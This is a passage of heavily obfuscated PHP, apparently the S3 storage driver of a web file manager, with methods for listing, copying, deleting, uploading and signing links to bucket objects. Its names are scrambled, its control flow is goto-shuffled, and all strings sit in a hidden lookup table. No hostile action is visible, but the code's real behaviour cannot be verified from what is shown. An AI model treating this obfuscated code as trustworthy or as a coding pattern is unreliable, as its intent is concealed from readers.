$EÑ™âÏÑÌÑ .= $A‚´ƒŒìëº[4] . $f …ñ¿ÉÜ€[$A‚´ƒŒìëº[167]]; } return $A¢œΩ˘É¨¬ . $A‚´ƒŒìëº[168] . $EÑ™âÏÑÌÑ; } public function pathEncode($CáîÇó…•è) { $fëá⁄À˘ñÁ =& $_SERVER[£¿ÌÙëü¡¯¯]; return str_replace($fëá⁄À˘ñÁ[169], $fëá⁄À˘ñÁ[8], rawurlencode($CáîÇó…•è)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($EÆÍÈ‚√Ï˜) { set_timeout(); require_once SDK_DIR . $_SERVER[£¿ÌÙëü¡¯¯][170]; parent::__construct(); $this->_init($EÆÍÈ‚√Ï˜); } public function _init($f€§Ω„˘Á“) { foreach ($f€§Ω„˘Á“ as $d⁄≥≤¢ê¥ => $FÖ®ÈÛÌÈ) { if (isset($this->{$d⁄≥≤¢ê¥})) { $this->{$d⁄≥≤¢ê¥} = $FÖ®ÈÛÌÈ; } } $this->endpoint = $f€§Ω„˘Á“[$_SERVER[£¿ÌÙëü¡¯¯][171]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); $this->client->setChunkSize($this->osChunkSize()); } public function signatureVersion($b‹÷≥ê◊´  = "\166\64") { $this->signVer = $b‹÷≥ê◊´ ; $this->client->setSignatureVersion($b‹÷≥ê◊´ ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto b”í›ñ Àè; aÜÎ«ÿö£”: if ($bª–†Â‡õ™[$Fîß†´‹∆Œ[172]] != $Fîß†´‹∆Œ[173] || $bª–†Â‡õ™[$Fîß†´‹∆Œ[174]] != $Fîß†´‹∆Œ[173]) { return !1; } $Féã¯ñµ‡∞ = array_map($Fîß†´‹∆Œ[175], $bª–†Â‡õ™[$Fîß†´‹∆Œ[176]]); if (!is_array($Féã¯ñµ‡∞)) { $Féã¯ñµ‡∞ = array(); } goto CõñÖùø§Â; b”í›ñ Àè: $Fîß†´‹∆Œ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bª–†Â‡õ™ = $this->getBucketCors(); if (!$bª–†Â‡õ™ || !is_array($bª–†Â‡õ™)) { return !1; } goto aÜÎ«ÿö£”; CõñÖùø§Â: $c˘ìéí≠ùë = array($Fîß†´‹∆Œ[177], $Fîß†´‹∆Œ[178], $Fîß†´‹∆Œ[179], $Fîß†´‹∆Œ[180], $Fîß†´‹∆Œ[181]); $B‘◊ÚóëÿÎ = array_diff($c˘ìéí≠ùë, $Féã¯ñµ‡∞); return empty($B‘◊ÚóëÿÎ); goto B≥ÂÓã√˘»; B≥ÂÓã√˘»: } public function mkfile($FπŸ…üœ›ò, $E⁄êﬁÊúçì = '', $B±•óâÇáœ = REPEAT_RENAME) { $BºÇºÏúóà = $this->setContent($FπŸ…üœ›ò, $E⁄êﬁÊúçì); if ($BºÇºÏúóà !== !1) { return $this->getPathOuter($FπŸ…üœ›ò); } return !1; } public function mkdir($e∞¨ß¿åçì, $C÷Âº∏ø¢Ç = REPEAT_SKIP) { if (empty($e∞¨ß¿åçì)) { return !1; } if ($this->_isFolder($e∞¨ß¿åçì)) { return $this->getPathOuter($e∞¨ß¿åçì); } $aπÁ´ùÏ´í = $this->setContent($e∞¨ß¿åçì, $_SERVER[£¿ÌÙëü¡¯¯][33], !0); if ($aπÁ´ùÏ´í !== !1) { return $this->getPathOuter($e∞¨ß¿åçì); } return !1; } public function copyFile($bﬁŒΩú®Éﬁ, $E§Ñ‰ØŒŒÛ, $c´éâ‡π¿√ = array()) { $Eñ¬÷Ü©èπ =& $_SERVER[£¿ÌÙëü¡¯¯]; $BÑ›´…ù¥À = $this->objectMeta($bﬁŒΩú®Éﬁ); if (!$BÑ›´…ù¥À) { return !1; } if ($BÑ›´…ù¥À[$Eñ¬÷Ü©èπ[78]] <= 1024 * 1024 * 200) { $BûóÙ·…©‚ = $this->client->copyObject($this->bucket, $bﬁŒΩú®Éﬁ, $this->bucket, $E§Ñ‰ØŒŒÛ, $Eñ¬÷Ü©èπ[182], $c´éâ‡π¿√); } else { $BûóÙ·…©‚ = $this->client->multiCopyObject($this->bucket, $bﬁŒΩú®Éﬁ, $this->bucket, $E§Ñ‰ØŒŒÛ, $c´éâ‡π¿√); } $BûóÙ·…©‚ = $BûóÙ·…©‚ ? $this->getPathOuter($E§Ñ‰ØŒŒÛ) : !1; return $BûóÙ·…©‚; } public function moveFile($b·ŸÑåº£ù, $d”Êè¶Í»π) { if ($this->copyFile($b·ŸÑåº£ù, $d”Êè¶Í»π)) { $this->delFile($b·ŸÑåº£ù); return $this->getPathOuter($d”Êè¶Í»π); } return !1; } public function delFile($cÁâ…å¿ÈÔ) { return $this->client->deleteObject($this->bucket, $cÁâ…å¿ÈÔ); } public function delFolder($f–‡ÁﬁåÃÁ) { goto A©ó£”á‰Õ; bûö≤ã¡–Â: return $dÇÓ¯÷ÙÎÜ === $c°ûüíœûª ? !0 : !1; goto EΩÖÜ±ê€›; A©ó£”á‰Õ: $bÔçöØ«¡≥ =& $_SERVER[£¿ÌÙëü¡¯¯]; $c’Ÿ”âßÆ± = $this->listObjs($f–‡ÁﬁåÃÁ); if (!$c’Ÿ”âßÆ±) { $f–‡ÁﬁåÃÁ = trim($f–‡ÁﬁåÃÁ, $bÔçöØ«¡≥[8]); if (!empty($f–‡ÁﬁåÃÁ)) { $f–‡ÁﬁåÃÁ .= $bÔçöØ«¡≥[8]; } return $this->delFile($f–‡ÁﬁåÃÁ); } goto a«‰ äéƒÓ; a«‰ äéƒÓ: $dÇÓ¯÷ÙÎÜ = $c°ûüíœûª = 0; $fÂ™¿õ·ôÑ = array_chunk(array_keys($c’Ÿ”âßÆ±), 1000); foreach ($fÂ™¿õ·ôÑ as $BÃ√ÙèÌøó) { $dÇÓ¯÷ÙÎÜ++; $c°ûüíœûª += (int) $this->client->deleteObjects($this->bucket, $BÃ√ÙèÌøó); } goto bûö≤ã¡–Â; EΩÖÜ±ê€›: } public function rename($a§∂òÆΩ€», $DüÉäÂÔº∆) { return $this->renameObject($a§∂òÆΩ€», $DüÉäÂÔº∆); } public function listPath($cÖ´ÂÎÉÑ‡, $Dû•‚ﬂ˘€À = false) { $cÉùãœ‚à™ =& $_SERVER[£¿ÌÙëü¡¯¯]; $B’∂ê¡‡˜Ï = $this->listObjs($cÖ´ÂÎÉÑ‡, null, null, $cÉùãœ‚à™[8]); $fúıÖé¥¬ê = array($cÉùãœ‚à™[75] => array(), $cÉùãœ‚à™[74] => array()); foreach ($B’∂ê¡‡˜Ï as $AΩú∞üÃÆé => $DµœŸÛΩäô) { if ($AΩú∞üÃÆé == $cÉùãœ‚à™[8]) { continue; } if (isset($DµœŸÛΩäô[$cÉùãœ‚à™[183]])) { $fúıÖé¥¬ê[$cÉùãœ‚à™[75]][] = $this->folderInfo($DµœŸÛΩäô[$cÉùãœ‚à™[183]], $Dû•‚ﬂ˘€À); } else { if (substr($DµœŸÛΩäô[$cÉùãœ‚à™[28]], -1) == $cÉùãœ‚à™[8]) { continue; } $fúıÖé¥¬ê[$cÉùãœ‚à™[74]][] = $this->fileInfo($DµœŸÛΩäô[$cÉùãœ‚à™[28]], $Dû•‚ﬂ˘€À, $DµœŸÛΩäô); } } return $fúıÖé¥¬ê; } private function fileInfo($B‘´´û¨çí, $døà—¨ã°‘ = false, $a≈„Íó‚à‹ = array()) { goto BﬂîÙî¿ ◊; D°öÎî∏”Ó: return $B»ç“èÙçë; goto Bê‘ÂŒïÿù; BﬂîÙî¿ ◊: $aÓ°ﬁïàÇí =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($døà—¨ã°‘) { return array($aÓ°ﬁïàÇí[28] => $this->pathThis($B‘´´û¨çí), $aÓ°ﬁïàÇí[76] => $this->getPathOuter($B‘´´û¨çí), $aÓ°ﬁïàÇí[29] => $aÓ°ﬁïàÇí[164], $aÓ°ﬁïàÇí[157] => $this->ext($B‘´´û¨çí), $aÓ°ﬁïàÇí[78] => isset($a≈„Íó‚à‹[$aÓ°ﬁïàÇí[78]]) ? $a≈„Íó‚à‹[$aÓ°ﬁïàÇí[78]] : 0, $aÓ°ﬁïàÇí[184] => 0, $aÓ°ﬁïàÇí[108] => 0, $aÓ°ﬁïàÇí[185] => !0, $aÓ°ﬁïàÇí[186] => !0); } $B»ç“èÙçë = array($aÓ°ﬁïàÇí[28] => $this->pathThis($B‘´´û¨çí), $aÓ°ﬁïàÇí[76] => $this->getPathOuter($B‘´´û¨çí), $aÓ°ﬁïàÇí[29] => $aÓ°ﬁïàÇí[164], $aÓ°ﬁïàÇí[184] => 0, $aÓ°ﬁïàÇí[108] => 0, $aÓ°ﬁïàÇí[78] => 0, $aÓ°ﬁïàÇí[157] => $this->ext($B‘´´û¨çí), $aÓ°ﬁïàÇí[185] => !0, $aÓ°ﬁïàÇí[186] => !0); goto fëõ∏÷â∆ó; fëõ∏÷â∆ó: if (empty($a≈„Íó‚à‹)) { $a≈„Íó‚à‹ = $this->objectMeta($B‘´´û¨çí); if (!$a≈„Íó‚à‹) { return $B»ç“èÙçë; } } if (isset($a≈„Íó‚à‹[$aÓ°ﬁïàÇí[187]])) { $B»ç“èÙçë[$aÓ°ﬁïàÇí[108]] = $a≈„Íó‚à‹[$aÓ°ﬁïàÇí[187]]; } if (isset($a≈„Íó‚à‹[$aÓ°ﬁïàÇí[78]])) { $B»ç“èÙçë[$aÓ°ﬁïàÇí[78]] = $a≈„Íó‚à‹[$aÓ°ﬁïàÇí[78]]; } goto D°öÎî∏”Ó; Bê‘ÂŒïÿù: } private function folderInfo($F‡áµ≠≈ŸÀ, $aΩîÎøÊÖ˘ = false) { goto CÌäÇéø˘¿; CÌäÇéø˘¿: $F”ò†Íö–ı =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($aΩîÎøÊÖ˘) { return array($F”ò†Íö–ı[28] => $this->pathThis($F‡áµ≠≈ŸÀ), $F”ò†Íö–ı[76] => $this->getPathOuter($F”ò†Íö–ı[8] . $F‡áµ≠≈ŸÀ), $F”ò†Íö–ı[29] => $F”ò†Íö–ı[77], $F”ò†Íö–ı[185] => !0, $F”ò†Íö–ı[186] => !0); } $f”∆ü“ä–∏ = array($F”ò†Íö–ı[28] => $this->pathThis($F‡áµ≠≈ŸÀ), $F”ò†Íö–ı[76] => $this->getPathOuter($F”ò†Íö–ı[8] . $F‡áµ≠≈ŸÀ), $F”ò†Íö–ı[29] => $F”ò†Íö–ı[77], $F”ò†Íö–ı[184] => 0, $F”ò†Íö–ı[108] => 0, $F”ò†Íö–ı[185] => !0, $F”ò†Íö–ı[186] => !0); goto f∏˘ãØπãÙ; CˆÒâÓÖ¥‰: if (!$aØ◊œÕ¢Ù‘) { return $f”∆ü“ä–∏; } if (isset($d⁄æÉÌéâ∂[$F”ò†Íö–ı[187]])) { $f”∆ü“ä–∏[$F”ò†Íö–ı[184]] = $d⁄æÉÌéâ∂[$F”ò†Íö–ı[187]]; } return $f”∆ü“ä–∏; goto A ¿Üôüˆà; f∏˘ãØπãÙ: if ($F‡áµ≠≈ŸÀ == $F”ò†Íö–ı[33]) { return $f”∆ü“ä–∏; } $F‡áµ≠≈ŸÀ = trim($F‡áµ≠≈ŸÀ, $F”ò†Íö–ı[8]) . $F”ò†Íö–ı[8]; $aØ◊œÕ¢Ù‘ = $this->objectMeta($F‡áµ≠≈ŸÀ); goto CˆÒâÓÖ¥‰; A ¿Üôüˆà: } public function listObjs($eÜµØÈ Öù, $DÉ±õå÷ôû = null, $BûËÂÔ∏Û¡ = null, $bú©Ñ˘ÚËß = null) { $D»Çà‚ÔØ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eÜµØÈ Öù = trim($eÜµØÈ Öù, $D»Çà‚ÔØ[8]); $bïË«Ç¢àÀ = empty($eÜµØÈ Öù) ? $D»Çà‚ÔØ[33] : $eÜµØÈ Öù . $D»Çà‚ÔØ[8]; return $this->client->getBucket($this->bucket, $bïË«Ç¢àÀ, $DÉ±õå÷ôû, $BûËÂÔ∏Û¡, $bú©Ñ˘ÚËß, !0); } public function has($b†¨ãçÎ†ã, $aíìÜ–†Â√ = false, $dÁ‘‡∞òøΩ = true) { goto eÌÍñΩ™†Æ; eÌÍñΩ™†Æ: $bå¿’È§Úº =& $_SERVER[£¿ÌÙëü¡¯¯]; $Cöéæå Ùˆ = 0; $f’ÍƒïêÉç = 0; goto Dâí—É…à∫; Dâí—É…à∫: $A∂«ﬂÙÓ¨Ÿ = $this->listObjs($b†¨ãçÎ†ã, null, null, $bå¿’È§Úº[8]); $A∂«ﬂÙÓ¨Ÿ = is_array($A∂«ﬂÙÓ¨Ÿ) ? $A∂«ﬂÙÓ¨Ÿ : array(); foreach ($A∂«ﬂÙÓ¨Ÿ as $d∫å∞–”Î∂) { if (isset($d∫å∞–”Î∂[$bå¿’È§Úº[28]]) && substr($d∫å∞–”Î∂[$bå¿’È§Úº[28]], -1) != $bå¿’È§Úº[8]) { if (!$aíìÜ–†Â√ && $dÁ‘‡∞òøΩ) { return !0; } $Cöéæå Ùˆ++; } else { if (isset($d∫å∞–”Î∂[$bå¿’È§Úº[183]])) { if (!$aíìÜ–†Â√ && !$dÁ‘‡∞òøΩ) { return !1; } $f’ÍƒïêÉç++; } } } goto D’Áﬁ≤ø≥©; D’Áﬁ≤ø≥©: if ($aíìÜ–†Â√) { return array($bå¿’È§Úº[188] => $Cöéæå Ùˆ, $bå¿’È§Úº[189] => $f’ÍƒïêÉç); } return !1; goto bﬂ–À‹Õõë; bﬂ–À‹Õõë: } public function listAll($bÁáœìÒÑÚ) { $dïàÑŸëÜå =& $_SERVER[£¿ÌÙëü¡¯¯]; $Fó≥¬ºÇÑû = $this->listObjs($bÁáœìÒÑÚ); $B»õ∆ûÏºÀ = $D„ñÛÕ¨Êå = array(); foreach ($Fó≥¬ºÇÑû as $fâò„Û∂ÑÑ => $c√èàè°‡Ò) { $B»õ∆ûÏºÀ[] = $c√èàè°‡Ò[$dïàÑŸëÜå[28]]; $D„ñÛÕ¨Êå[$fâò„Û∂ÑÑ] = $c√èàè°‡Ò[$dïàÑŸëÜå[78]]; } return $this->listAllFiles($bÁáœìÒÑÚ, $B»õ∆ûÏºÀ, $D„ñÛÕ¨Êå); } public function canRead($aòä¿©⁄Ùπ) { $cûñÊﬁÀå° =& $_SERVER[£¿ÌÙëü¡¯¯]; $b∞ñ∫ó Õ∑ = $this->client->getAccessControlPolicy($this->bucket, $aòä¿©⁄Ùπ); if (!$b∞ñ∫ó Õ∑) { return !1; } return in_array($b∞ñ∫ó Õ∑, array($cûñÊﬁÀå°[190], $cûñÊﬁÀå°[191], $cûñÊﬁÀå°[192])) ? !0 : !1; } public function canWrite($D˘≈†€é„ö) { $e€àÚä·ë÷ =& $_SERVER[£¿ÌÙëü¡¯¯]; $e˘»“€®¡å = $this->client->getAccessControlPolicy($this->bucket, $D˘≈†€é„ö); if (!$e˘»“€®¡å) { return !1; } return in_array($e˘»“€®¡å, array($e€àÚä·ë÷[190], $e€àÚä·ë÷[191])) ? !0 : !1; } public function getContent($aÕÊãÏ«πü) { return $this->client->getObject($this->bucket, $aÕÊãÏ«πü); } public function setContent($d‰ŸÎ∂”â‘, $dÇπ—öéô´ = '', $EñüÊ„‰ﬂµ = false) { goto CÇ◊ÿπ‹≈Ö; dÊÎ⁄ûòïÙ: $EóÖÖ®¿≤≠ = $this->copyFile($d‰ŸÎ∂”â‘, $d‰ŸÎ∂”â‘, array($D≈Ô¿ Èé≥[193] => $EóÖÖ®¿≤≠[$D≈Ô¿ Èé≥[194]])); return $EóÖÖ®¿≤≠ ? !0 : !1; goto C‘ÎÍŸ Õ˜; AÖëÂ∞≥ëÜ: $EóÖÖ®¿≤≠ = $this->client->putObject($dÇπ—öéô´, $this->bucket, $d‰ŸÎ∂”â‘, $D≈Ô¿ Èé≥[182], array(), $F†≤ã‹éÎö); if (!$EóÖÖ®¿≤≠) { return !1; } if ($EñüÊ„‰ﬂµ) { return !0; } goto dÊÎ⁄ûòïÙ; CÇ◊ÿπ‹≈Ö: $D≈Ô¿ Èé≥ =& $_SERVER[£¿ÌÙëü¡¯¯]; $d‰ŸÎ∂”â‘ = $EñüÊ„‰ﬂµ ? trim($d‰ŸÎ∂”â‘, $D≈Ô¿ Èé≥[8]) . $D≈Ô¿ Èé≥[8] : $d‰ŸÎ∂”â‘; $F†≤ã‹éÎö = get_file_mime(get_path_ext($d‰ŸÎ∂”â‘)); goto AÖëÂ∞≥ëÜ; C‘ÎÍŸ Õ˜: } public function fileSubstr($F€”æÉ†∫Ñ, $Cÿ¥‡™Óàë, $FŸìûÓˆ… ) { $DÒ˜õ¿ö©ÿ = $Cÿ¥‡™Óàë + $FŸìûÓˆ…  - 1; return $this->client->getObject($this->bucket, $F€”æÉ†∫Ñ, array($_SERVER[£¿ÌÙëü¡¯¯][195] => "\142\171\164\x65\x73\75{$Cÿ¥‡™Óàë}\55{$DÒ˜õ¿ö©ÿ}")); } public function upload($E„ˆçîØµ•, $B£∏„à•‘Ç, $AÒ¡¶Í≤œπ = false, $EãÉØï¥è‡ = REPEAT_REPLACE) { $E¥À»–¯ﬁ™ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Eûﬁ∑°Ôå„ = array($E¥À»–¯ﬁ™[193] => @md5_file($B£∏„à•‘Ç)); $dƒ÷Ö†≥Íª = array($E¥À»–¯ﬁ™[196] => get_file_mime(get_path_ext($E„ˆçîØµ•))); if (IO::size($B£∏„à•‘Ç) <= 1024 * 1024 * 200) { $eÛ›ß‡ÓËû = $this->client->putObjectFile($B£∏„à•‘Ç, $this->bucket, $E„ˆçîØµ•, $E¥À»–¯ﬁ™[182], $Eûﬁ∑°Ôå„, $dƒ÷Ö†≥Íª); return !empty($eÛ›ß‡ÓËû) ? $this->getPathOuter($E„ˆçîØµ•) : !1; } $eÉø´È¨Ω¯ = $this->client->multiUploadObject($B£∏„à•‘Ç, $this->bucket, trim($E„ˆçîØµ•, $E¥À»–¯ﬁ™[8]), $Eûﬁ∑°Ôå„, $dƒ÷Ö†≥Íª); return $eÉø´È¨Ω¯ ? $this->getPathOuter($E„ˆçîØµ•) : !1; } public function download($Bêÿ¢ ¿Óç, $aµ˜áºàñÇ) { if (!@is_dir($this->pathFather($aµ˜áºàñÇ)) && !IO::mkdir($this->pathFather($aµ˜áºàñÇ))) { return !1; } $dÁ¨ãÓÇõµ = $this->client->getObject($this->bucket, $Bêÿ¢ ¿Óç, array(), $aµ˜áºàñÇ); return $dÁ¨ãÓÇõµ !== !1 ? $aµ˜áºàñÇ : !1; } public function link($BÓÒÚÖ¨ëı, $fú„ä´øäŸ = array()) { $F´°µ§ãˆâ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($this->signVer == $F´°µ§ãˆâ[197]) { return $this->client->getAuthenticatedURL($this->bucket, $BÓÒÚÖ¨ëı, 3600 * 12, $fú„ä´øäŸ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($BÓÒÚÖ¨ëı, $F´°µ§ãˆâ[8]), 3600 * 12, $this->region, array(), !0, $fú„ä´øäŸ); } public function fileOut($f¿◊Í≈ﬂ©à, $e©Ÿ„ÑÙñ¿ = false, $FòùµÖüﬂ± = false, $cÀ±√ˆ≈÷ß = '') { goto aÛÎÑîáÕò; e™…ÑÛ·¿: if ($D≥òüˆ±∆Ø == $BÆòµ⁄ã—ã[198]) { return parent::fileOut($f¿◊Í≈ﬂ©à, $e©Ÿ„ÑÙñ¿, $FòùµÖüﬂ±, $cÀ±√ˆ≈÷ß); } $e©Ÿ„ÑÙñ¿ = $e©Ÿ„ÑÙñ¿ ? $BÆòµ⁄ã—ã[199] : $BÆòµ⁄ã—ã[200]; $D¥¢ê‹∂ÕË = array($BÆòµ⁄ã—ã[201] => $e©Ÿ„ÑÙñ¿ . $BÆòµ⁄ã—ã[202] . rawurlencode($FòùµÖüﬂ±), $BÆòµ⁄ã—ã[203] => $D≥òüˆ±∆Ø); goto E⁄ì±ì–›·; aÛÎÑîáÕò: $BÆòµ⁄ã—ã =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$FòùµÖüﬂ±) { $FòùµÖüﬂ± = $this->pathThis($f¿◊Í≈ﬂ©à); } $D≥òüˆ±∆Ø = get_file_mime(get_path_ext($FòùµÖüﬂ±)); goto e™…ÑÛ·¿; E⁄ì±ì–›·: $A¨ëÔ£“¶· = $this->link($f¿◊Í≈ﬂ©à, $D¥¢ê‹∂ÕË); $this->fileOutLink($A¨ëÔ£“¶·); goto E£¨Ï÷‰∫ö; E£¨Ï÷‰∫ö: } public function fileOutServer($cù§÷”¿È§, $Eäî≈åã¯ê = false, $Dîπ–÷’ﬂ≠ = false, $Eâ√Ïé∏Ï´ = '') { parent::fileOut($cù§÷”¿È§, $Eäî≈åã¯ê, $Dîπ–÷’ﬂ≠, $Eâ√Ïé∏Ï´); } public function fileOutImage($Bƒ†∑…Œ®í, $e˘òÓé˘òﬂ = 250) { $Eç∆÷åÜÚë = $this->link($Bƒ†∑…Œ®í); $this->fileOutLink($Eç∆÷åÜÚë); } public function fileOutImageServer($BÙüÓﬂˆÈé, $f€åˆÈﬁ∑Æ = 250) { parent::fileOutImage($BÙüÓﬂˆÈé, $f€åˆÈﬁ∑Æ); } public function hashMd5($cå©†ã›Úπ, $E≥ê ·ÇîÀ = '') { $Eéö—È∫Ã„ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aÛºΩï‹ØÙ = $this->objectMeta($cå©†ã›Úπ); if (!$aÛºΩï‹ØÙ) { return !1; } $E≥ê ·ÇîÀ = $E≥ê ·ÇîÀ ? $E≥ê ·ÇîÀ : _get($aÛºΩï‹ØÙ, $Eéö—È∫Ã„[204]); $E≥ê ·ÇîÀ = $E≥ê ·ÇîÀ ? $E≥ê ·ÇîÀ : _get($aÛºΩï‹ØÙ, $Eéö—È∫Ã„[194], $Eéö—È∫Ã„[33]); return $E≥ê ·ÇîÀ; } public function uploadFormData($FÏ¡±´¨¬Ã, $BúÌñ–¨∂ì = 3600) { $düﬂËßºß– =& $_SERVER[£¿ÌÙëü¡¯¯]; $b“ú≤Ãëúº = $this->pathFather($FÏ¡±´¨¬Ã); $eÏ´…Î≤Ù˘ = $this->client->getHttpUploadPostParams($this->bucket, $b“ú≤Ãëúº, $düﬂËßºß–[182], $BúÌñ–¨∂ì); return array_merge((array) $eÏ´…Î≤Ù˘, array($düﬂËßºß–[166] => $this->getHost())); } public function multiUploadFormData($b»‚ﬁ⁄ÖÍ◊, $A¯òΩ∞≥â“ = 3600) { $eòàî«ãÿÌ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aƒáîÈ±ñÖ = gmdate($eòàî«ãÿÌ[205]); $c¬¿ä™‚–≠ = array(); $F≥å®ê√É† = $this->client->getUploadId($this->bucket, $b»‚ﬁ⁄ÖÍ◊, $c¬¿ä™‚–≠); if (!$F≥å®ê√É†) { return !1; } return array($eòàî«ãÿÌ[206] => $F≥å®ê√É†, $eòàî«ãÿÌ[166] => $this->getHost() . $eòàî«ãÿÌ[8] . $this->pathEncode($b»‚ﬁ⁄ÖÍ◊), $eòàî«ãÿÌ[207] => $aƒáîÈ±ñÖ, $eòàî«ãÿÌ[90] => $b»‚ﬁ⁄ÖÍ◊); } public function multiUploadAuthData($DÁ«ªá¥êñ, $D∑üîôäΩ˜ = array()) { goto d¡áê—óñÑ; B§ÎŒÛùì´: $f–∆ç≈—â® = implode($D¡¡ê¥Á“⁄[214], $a‡¢Ãñóˆß); $cıòû∂›àÍ = base64_encode(hash_hmac($D¡¡ê¥Á“⁄[215], $f–∆ç≈—â®, $this->secret, !0)); $fê”™◊™—’ = $D¡¡ê¥Á“⁄[216] . $this->accessKey . $D¡¡ê¥Á“⁄[4] . $cıòû∂›àÍ; goto D≠£Œô©ôá; D≠£Œô©ôá: if (strpos($b◊ëáËä™“, $D¡¡ê¥Á“⁄[210]) === 0) { return array($D¡¡ê¥Á“⁄[217] => $fê”™◊™—’, $D¡¡ê¥Á“⁄[207] => $Eá∞‹Ëçè±); } return $fê”™◊™—’; goto CòØÍÍÉ´◊; CœŸëƒÂâ›: $a‡¢Ãñóˆß = array($D¡¡ê¥Á“⁄[209], $D¡¡ê¥Á“⁄[33], $D¡¡ê¥Á“⁄[117], $D¡¡ê¥Á“⁄[33], "\170\x2d\x61\155\x7a\x2d\x64\x61\164\145\72{$Eá∞‹Ëçè±}", $D¡¡ê¥Á“⁄[8] . $this->bucket . $D¡¡ê¥Á“⁄[8] . $this->pathEncode($DæœòÉ›°ê) . $b◊ëáËä™“); if (strpos($b◊ëáËä™“, $D¡¡ê¥Á“⁄[210]) === 0) { $a‡¢Ãñóˆß[0] = $D¡¡ê¥Á“⁄[211]; } if (isset($D∑üîôäΩ˜[$D¡¡ê¥Á“⁄[212]]) && $D∑üîôäΩ˜[$D¡¡ê¥Á“⁄[212]] == $D¡¡ê¥Á“⁄[213]) { $a‡¢Ãñóˆß[0] = $D¡¡ê¥Á“⁄[213]; } goto B§ÎŒÛùì´; d¡áê—óñÑ: $D¡¡ê¥Á“⁄ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Eá∞‹Ëçè± = isset($D∑üîôäΩ˜[$D¡¡ê¥Á“⁄[207]]) ? $D∑üîôäΩ˜[$D¡¡ê¥Á“⁄[207]] : gmdate($D¡¡ê¥Á“⁄[205]); $b◊ëáËä™“ = isset($D∑üîôäΩ˜[$D¡¡ê¥Á“⁄[157]]) ? $D∑üîôäΩ˜[$D¡¡ê¥Á“⁄[157]] : $D¡¡ê¥Á“⁄[33]; goto cïÊ®ÑÌŒˆ; cïÊ®ÑÌŒˆ: $DæœòÉ›°ê = $D∑üîôäΩ˜[$D¡¡ê¥Á“⁄[90]]; unset($D∑üîôäΩ˜[$D¡¡ê¥Á“⁄[90]]); if (isset($D∑üîôäΩ˜[$D¡¡ê¥Á“⁄[208]])) { $D∑üîôäΩ˜[$D¡¡ê¥Á“⁄[207]] = $Eá∞‹Ëçè±; return $this->listUploadParts($DæœòÉ›°ê, $D∑üîôäΩ˜); } goto CœŸëƒÂâ›; CòØÍÍÉ´◊: } public function listUploadParts($eÍÖ®¢©ü», $f¿®¶»Ù∫™ = array()) { goto BÌú«◊ÃùÕ; c»ÂüÈç·ß: if (!$CÜ—ê™‚÷§) { return !1; } unset($f¿®¶»Ù∫™[$F¯ç¥ª—¿˜[208]], $f¿®¶»Ù∫™[$F¯ç¥ª—¿˜[212]]); $f¿®¶»Ù∫™[$F¯ç¥ª—¿˜[90]] = $eÍÖ®¢©ü»; goto bä«Î≈é›Û; bä«Î≈é›Û: $EÙ√—ªä±í = $this->multiUploadAuthData($eÍÖ®¢©ü», $f¿®¶»Ù∫™); if (empty($EÙ√—ªä±í)) { return !1; } return array($F¯ç¥ª—¿˜[217] => $EÙ√—ªä±í, $F¯ç¥ª—¿˜[207] => $f¿®¶»Ù∫™[$F¯ç¥ª—¿˜[207]], $F¯ç¥ª—¿˜[219] => $CÜ—ê™‚÷§); goto A¢õÉ¬ΩÑ; BÌú«◊ÃùÕ: $F¯ç¥ª—¿˜ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aâ≥πèÿÍÆ = str_replace($F¯ç¥ª—¿˜[218], $F¯ç¥ª—¿˜[33], $f¿®¶»Ù∫™[$F¯ç¥ª—¿˜[157]]); $CÜ—ê™‚÷§ = $this->client->listParts($this->bucket, $eÍÖ®¢©ü», $aâ≥πèÿÍÆ); goto c»ÂüÈç·ß; A¢õÉ¬ΩÑ: } public function getHost() { return parent::getHost() . $_SERVER[£¿ÌÙëü¡¯¯][8] . $this->bucket; } public function size($f©µÑﬁÃàÆ) { $f≥’äÿôŸ˘ = $this->objectMeta($f©µÑﬁÃàÆ); return $f≥’äÿôŸ˘ ? $f≥’äÿôŸ˘[$_SERVER[£¿ÌÙëü¡¯¯][78]] : 0; } public function info($cï˘º∞†Ñµ) { if ($this->isFolder($cï˘º∞†Ñµ)) { return $this->folderInfo($cï˘º∞†Ñµ); } else { if ($this->isFile($cï˘º∞†Ñµ)) { return $this->fileInfo($cï˘º∞†Ñµ); } } return !1; } public function exist($BìØ°à‘Ω¥) { return $this->isFile($BìØ°à‘Ω¥) || $this->isFolder($BìØ°à‘Ω¥); } public function isFile($D“Ωà≈ëáË) { return !$this->isFolder($D“Ωà≈ëáË) && $this->objectMeta($D“Ωà≈ëáË); } public function isFolder($CƒÊ‡‹∑ü±) { return $this->cacheMethod($_SERVER[£¿ÌÙëü¡¯¯][220], $CƒÊ‡‹∑ü±); } protected function objectMeta($C≠¥Ô¥∑ô£) { return $this->cacheMethod($_SERVER[£¿ÌÙëü¡¯¯][221], $C≠¥Ô¥∑ô£); } protected function _objectMeta($DÚ¡Áãê§∫) { $A∏…à⁄»õí =& $_SERVER[£¿ÌÙëü¡¯¯]; $DÚ¡Áãê§∫ = rtrim($DÚ¡Áãê§∫, $A∏…à⁄»õí[8]); try { $d¶º∂ﬂˆõÆ = $this->client->getObjectInfo($this->bucket, $DÚ¡Áãê§∫); if (!isset($d¶º∂ﬂˆõÆ[$A∏…à⁄»õí[204]]) && isset($d¶º∂ﬂˆõÆ[$A∏…à⁄»õí[222]])) { $d¶º∂ﬂˆõÆ[$A∏…à⁄»õí[204]] = $d¶º∂ﬂˆõÆ[$A∏…à⁄»õí[222]]; } } 